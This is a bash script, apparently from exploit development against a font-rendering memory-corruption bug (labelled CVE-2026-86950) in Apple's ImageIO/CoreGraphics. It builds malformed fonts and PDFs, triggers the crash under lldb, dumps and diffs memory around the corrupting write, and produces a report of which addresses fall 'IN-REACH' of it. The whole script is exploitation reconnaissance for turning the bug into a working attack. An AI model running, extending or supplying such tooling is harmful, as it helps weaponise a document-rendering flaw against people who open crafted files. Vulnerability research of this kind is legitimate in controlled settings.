#!/bin/bash
# RIP-1b: zone recon v2 — x27 captured at walk site (+1804) where it is LIVE.
# Session A (survive L=64): x27 + zone-line dumps + probe reach map.
# Session B (strike L=32640): x27 + pre dumps -> crash -> bt + post dumps -> diff.
set -x
cd detonation/cve-2026-86950
clang -O2 -g -o render2 render2.c -framework ImageIO -framework CoreGraphics -framework CoreFoundation || exit 8
clang -O2 -g -o render3 render3.c -framework ImageIO -framework CoreGraphics -framework CoreFoundation || exit 9
[ -x venv/bin/python ] || python3 -m venv venv
./venv/bin/pip -q install fonttools
./venv/bin/python - << 'PYB'
import sys; sys.path.insert(0, '.')
from gen_k2 import build_font
build_font("k2_q64.ttf", 64)
build_font("k2_s32640.ttf", 32640)
print("fonts built")
PYB
./venv/bin/python gen_pdf.py k2_q64.pdf k2_q64.ttf
./venv/bin/python gen_pdf.py k2_s32640.pdf k2_s32640.ttf

# shared: entry bp -> delete -> walk bp at $pc+1804
{
  echo "breakpoint set -n aa_cache_render"
  echo "process launch -- k2_q64.pdf a.png"
  echo "breakpoint delete 1"
  echo "breakpoint set -a \$pc+1804"
  echo "continue"
  echo "register read x27 x22"
  for o in 0x1f0000 0x1f8000 0x1fc000 0x1fe000 0x200000 0x202000; do
    echo "memory read --size 8 --count 64 --format x \$x27+$o"
  done
  echo "breakpoint delete 2"
  echo "continue"
  echo "quit"
} > cmdsA.txt
lldb -b -s cmdsA.txt ./render3 > sessA.txt 2>&1 || true

{
  echo "breakpoint set -n aa_cache_render"
  echo "process launch -- k2_s32640.pdf b.png"
  echo "breakpoint delete 1"
  echo "breakpoint set -a \$pc+1804"
  echo "continue"
  echo "register read x27 x22"
  for o in 0x1f0000 0x1f8000 0x1fc000 0x1fe000 0x200000 0x202000; do
    echo "memory read --size 8 --count 64 --format x \$x27+$o"
  done
  echo "breakpoint delete 2"
  echo "continue"
  echo "bt"
  echo "register read x27 pc lr"
  for o in 0x1f0000 0x1f8000 0x1fc000 0x1fe000 0x200000 0x202000; do
    echo "memory read --size 8 --count 64 --format x \$x27+$o"
  done
  echo "quit"
} > cmdsB.txt
lldb -b -s cmdsB.txt ./render3 > sessB.txt 2>&1 || true

# one plain render3 strike (probe behavior under strike, no lldb)
./render3 k2_s32640.pdf b_plain.png > b_plain.out 2> b_plain.err || true

# --- analysis
./venv/bin/python - << 'PYA'
import re
def parse_session(fn):
    txt = open(fn, errors='replace').read()
    out = {'x27': None, 'x22': None, 'dumps': [], 'bt': [], 'stop': '', 'probes': [], 'canvas': None, 'relcb': False, 'fault': ''}
    m = re.findall(r'x27 = (0x[0-9a-f]+)', txt)
    if m: out['x27'] = int(m[-1], 16)
    m = re.findall(r'x22 = (0x[0-9a-f]+)', txt)
    if m: out['x22'] = int(m[-1], 16)
    for ms in re.finditer(r'stop reason = (.*)', txt): out['stop'] += ms.group(1)[:160]+' | '
    mf = re.search(r'address=0x([0-9a-f]+)', out['stop'])
    if mf: out['fault'] = '0x'+mf.group(1)
    out['bt'] = [l.strip() for l in txt.splitlines() if 'frame #' in l]
    cur = []
    for ln in txt.splitlines():
        m2 = re.match(r'^(0x[0-9a-f]+):\s((?:0x[0-9a-f]+\s*)+)$', ln.strip())
        if m2:
            addr = int(m2.group(1),16)
            for v in m2.group(2).split():
                cur.append((addr, int(v,16))); addr += 8
        elif cur:
            out['dumps'].append(cur); cur = []
    if cur: out['dumps'].append(cur)
    out['probes'] = re.findall(r'(PROBE\d [^=\n]*|CANVAS copybase)=(0x[0-9a-f]+)', txt)
    mc = re.search(r'CANVAS copybase=(0x[0-9a-f]+)', txt)
    if mc: out['canvas'] = int(mc.group(1),16)
    out['relcb'] = 'REL_CB fired' in txt
    return out
A = parse_session('sessA.txt'); B = parse_session('sessB.txt')
rep = open('rip1_report.txt','w')
def W(*a): print(*a); print(*a, file=rep)
W("=== RIP-1b ZONE RECON REPORT ===")
W("A: x27=%s x22=%s canvas=%s relcb=%s" % (hex(A['x27']) if A['x27'] else '?', hex(A['x22']) if A['x22'] else '?', hex(A['canvas']) if A['canvas'] else '?', A['relcb']))
if A['x27']:
    for name, addr in A['probes']:
        d = int(addr,16) - A['x27']
        W("  reach %-28s %s delta=%s%d %s" % (name, addr, '+' if d>=0 else '', d, "IN-REACH" if 0 < d <= 0x210000 else ""))
    if A['canvas']: W("  canvas delta=%+d" % (A['canvas']-A['x27']))
W("A stops: %s" % A['stop'][:300])
W("B: x27=%s x22=%s fault=%s" % (hex(B['x27']) if B['x27'] else '?', hex(B['x22']) if B['x22'] else '?', B['fault']))
W("B stops: %s" % B['stop'][:300])
W("B bt (top frames):")
for fr in B['bt'][:6]: W("   %s" % fr[:150])
W("=== STRIKE FOOTPRINT (B pre vs post, offset from x27) ===")
if B['x27'] and len(B['dumps']) >= 12:
    pre, post = B['dumps'][:6], B['dumps'][6:12]
    nchg = 0
    for pi in range(min(len(pre), len(post))):
        pmap = dict(pre[pi])
        for addr, v in post[pi]:
            if pmap.get(addr) != v:
                nchg += 1
                if nchg <= 48:
                    W("  chg %+d: %s -> %s" % (addr-B['x27'], hex(pmap.get(addr,0)), hex(v)))
    W("  total changed qwords:", nchg)
else:
    W("  dumps:", len(B['dumps']))
W("=== B pre-dump non-node-like qwords (offset: value) ===")
if B['x27'] and B['dumps']:
    for addr, v in B['dumps'][2][:64]:
        off = addr - B['x27']
        if v and not (0x130000000 <= v <= 0x170000000):
            W("  %+d = %#x" % (off, v))
rep.close()
PYA

cd ../..
mkdir -p findings
cp detonation/cve-2026-86950/{sessA.txt,sessB.txt,rip1_report.txt,cmdsA.txt,cmdsB.txt,b_plain.err,b_plain.out} findings/ 2>/dev/null
cp detonation/cve-2026-86950/{a.png,b.png,b_plain.png} findings/ 2>/dev/null
ls findings/ | wc -l
cat detonation/cve-2026-86950/rip1_report.txt 2>/dev/null | head -80
